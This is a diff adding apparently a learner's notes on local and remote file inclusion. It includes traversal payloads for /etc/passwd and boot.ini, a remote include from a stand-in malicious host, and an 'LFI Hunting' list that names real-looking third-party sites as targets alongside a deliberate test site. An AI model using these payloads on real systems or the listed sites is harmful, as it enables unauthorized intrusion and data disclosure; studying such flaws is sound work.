@@ -1,0 +1,82 @@
+Imapct of File inclusion 
+
+code execution on server 
+
+code execution client side 
+
+dos attack 
+
+information disclosure 
+
+Local file inclusion 
+
+anyparameter=somelocalfile 
+
+example 
+
+any.com/index.php?referee=login.php
+
+
+Remote File Inclusion 
+
+anyparmeter=remoteweb.com/file 
+
+example: 
+
+any.com/?share=http://facebook.com/status?id=12672
+
+--------------------------------------------
+
+LFI Vs RFI 
+
+
+
+if target web server is reside on linux pltform 
+
+server path will be /var/www/html/trump.jpeg 
+
+
+any.com/index.php?file=trump.jpeg
+
+
+system configuration file by going root directory (/.bashrc)
+
+/etc/passwd
+any.com/index.php?file=../../../etc/passwd
+
+
+Remote file inclusion 
+
+any.com/index.php?file=http://remoteweb.com/trump.jpg 
+
+any.com/index.php?file=http://malacious.com/malacious.php
+
+what if target we server will be windows based then  
+
+C:\boot.ini 
+
+../../C:\boot.ini
+
+
+-----------------------------------------
+
+LFI Hunting 
+
+target - 
+testphp.vulnweb.com
+
+kanchanapisek.or.th
+
+http://www.thailandpost.co.th
+
+----------------------------------------
+
+Exploitation of LFI 
+
+
+-----------------------------------------
+
+RFI 
+
+
+
